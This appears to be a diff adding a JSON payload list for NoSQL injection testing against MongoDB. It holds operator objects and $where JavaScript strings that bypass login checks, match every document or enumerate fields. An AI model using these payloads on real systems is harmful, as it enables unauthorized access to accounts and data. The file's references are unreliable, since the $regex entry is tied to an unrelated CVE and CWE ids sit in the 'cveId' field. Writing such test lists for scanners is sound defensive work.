@@ -1,0 +1,66 @@
+[
+  {
+    "value": "{\"$gt\": \"\"}",
+    "description": "MongoDB NoSQL injection using $gt operator to bypass authentication",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "critical",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "{\"$ne\": null}",
+    "description": "MongoDB $ne (not equal) operator injection to match any document",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "critical",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "{\"$regex\": \".*\"}",
+    "description": "MongoDB $regex injection to match all documents",
+    "cveId": "CVE-2019-7609",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7609",
+    "severity": "high",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "{\"$where\": \"1==1\"}",
+    "description": "MongoDB $where operator injection executing arbitrary JavaScript",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "critical",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "{\"$in\": [\"admin\", \"Administrator\", \"root\"]}",
+    "description": "MongoDB $in operator injection to test common admin usernames",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "high",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "'; return '' == '",
+    "description": "MongoDB $where JavaScript injection to always return true",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "critical",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "{\"$exists\": true}",
+    "description": "MongoDB $exists operator to enumerate document fields",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "medium",
+    "dbTarget": "mongodb"
+  },
+  {
+    "value": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "description": "MongoDB full document bypass using $gt on both username and password",
+    "cveId": "CWE-943",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nosql+injection",
+    "severity": "critical",
+    "dbTarget": "mongodb"
+  }
+]
